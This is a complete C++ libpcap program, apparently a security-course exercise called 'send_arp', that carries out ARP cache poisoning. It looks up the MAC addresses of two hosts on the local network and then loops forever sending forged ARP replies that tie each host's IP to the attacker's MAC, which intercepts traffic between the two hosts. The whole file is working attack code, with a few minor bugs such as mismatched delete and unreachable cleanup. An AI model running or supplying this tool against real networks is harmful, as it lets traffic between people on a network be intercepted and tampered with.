#include <pcap.h>
#include <cstring>
#include <cstdio>
#include <iostream>
#include "Packet.h"
#include "EthPacket.h"
#include "ArpPacket.h"
#include "IpPacket.h"
#include "TcpPacket.h"
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include "Utils.h"
#include <boost/format.hpp>

void printHelp(const char* argv0, char* errbuf)
{
    std::cout << "send_arp" << std::endl;
    std::cout << "Usage: " << argv0 << " <interface> <sender ip> <target ip>" << std::endl;
    std::cout << "Available Devices" << std::endl;
    pcap_if_t* alldevsp;
    pcap_findalldevs(&alldevsp, errbuf);
    if(alldevsp != NULL) {
      for(pcap_if_t* curdevp = alldevsp; curdevp->next != NULL; curdevp = curdevp->next)
        std::cout << "  " << curdevp->name << std::endl;
    }
    std::exit(EXIT_FAILURE);
}

std::string toFilterString(uint8_t mac[6], uint32_t ip)
{
    return boost::str(boost::format("(arp[6:2] = 2) and src host %s and ether dst %s") % Utils::toIpString(ip) % Utils::toMacString(mac));
}

std::string toFilterString(uint8_t mac[6], uint8_t ip[4])
{
    return boost::str(boost::format("(arp[6:2] = 2) and src host %s and ether dst %s") % Utils::toIpString(ip) % Utils::toMacString(mac));
}

uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint8_t myIp[4], uint8_t otherIp[4])
{
    struct bpf_program prog;
    auto filterString = toFilterString(myMac, otherIp);
    std::cout << "filter string is " << filterString << std::endl;

    if(pcap_compile(handle, &prog, filterString.c_str(), 0, *reinterpret_cast<uint32_t*>(myIp)) == -1)
    {
        throw std::runtime_error{"Failed to compile filter"};
    }

    if(pcap_setfilter(handle, &prog) == -1)
    {
        throw std::runtime_error{"Failed to set filter"};
    }

    ArpPacket::request(
        handle,
        myMac,
        myIp,
        otherIp
    );


    struct pcap_pkthdr* pktHdr;
    const u_char* pkt;

    pcap_next_ex(handle, &pktHdr, &pkt);
    
    auto arpPkt = dynamic_cast<ArpPacket*>(Packet::parse(pkt, pktHdr->caplen));
    auto arpHdr = arpPkt->arpHeader();
    auto newMac = new uint8_t[6];
    memcpy(newMac, arpHdr->smac, 6);
    return newMac;
}

uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint32_t myIp, uint32_t otherIp)
{
    return queryMac(handle, myMac, reinterpret_cast<uint8_t*>(&myIp), reinterpret_cast<uint8_t*>(&otherIp));
}

int main(int argc, char** argv) {
    char errbuf[PCAP_ERRBUF_SIZE];
    if(argc < 4) {
         printHelp(argv[0], errbuf);
    }

    struct ifreq myMacIfr, myIpIfr;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strncpy(myMacIfr.ifr_name, argv[1], IFNAMSIZ - 1);
    strncpy(myIpIfr.ifr_name, argv[1], IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFHWADDR, &myMacIfr) != 0)
    {
        std::cout << "Failed to get MAC address" << std::endl;
        close(sock);
        std::exit(EXIT_FAILURE);
    }
    if(ioctl(sock, SIOCGIFADDR, &myIpIfr) != 0)
    {
        std::cout << "Failed to get IP address" << std::endl;
        close(sock);
        std::exit(EXIT_FAILURE);
    }
    close(sock);

    auto myIp = ((struct sockaddr_in*)&myIpIfr.ifr_addr)->sin_addr;
    auto myMac = myMacIfr.ifr_addr.sa_data;


    for(int i = 0; i < 6; ++i)
    {
      std::printf("%02x:", (unsigned char)myMac[i]);
    }
    std::printf("\n");
    printf("%s\n", inet_ntoa(myIp));

    std::cout << "sender: " << argv[2] << std::endl;
    std::cout << "target: " << argv[3] << std::endl;

    struct sockaddr_in senderAddress;
    inet_pton(AF_INET, argv[2], &senderAddress.sin_addr);


    struct sockaddr_in targetAddress;
    inet_pton(AF_INET, argv[3], &targetAddress.sin_addr);
    
    struct pcap_pkthdr* pktHdr;
    const u_char* pktRecv;

    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL)
    {
        std::cout << errbuf << std::endl;
        return -1;
    }

    auto senderMac = queryMac(handle, reinterpret_cast<uint8_t*>(myMac), myIp.s_addr, senderAddress.sin_addr.s_addr);
    auto targetMac = queryMac(handle, reinterpret_cast<uint8_t*>(myMac), myIp.s_addr, targetAddress.sin_addr.s_addr);
    
    while(true) {
        ArpPacket::reply(
            handle,
            reinterpret_cast<uint8_t*>(myMac),
            reinterpret_cast<uint8_t*>(&senderAddress.sin_addr.s_addr),
            reinterpret_cast<uint8_t*>(targetMac),
            reinterpret_cast<uint8_t*>(&targetAddress.sin_addr.s_addr)
        );
        ArpPacket::reply(
            handle,
            reinterpret_cast<uint8_t*>(myMac),
            reinterpret_cast<uint8_t*>(&targetAddress.sin_addr.s_addr),
            reinterpret_cast<uint8_t*>(senderMac),
            reinterpret_cast<uint8_t*>(&senderAddress.sin_addr.s_addr)
        );
    }
    delete senderMac;
    delete targetMac;

    pcap_close(handle);
}
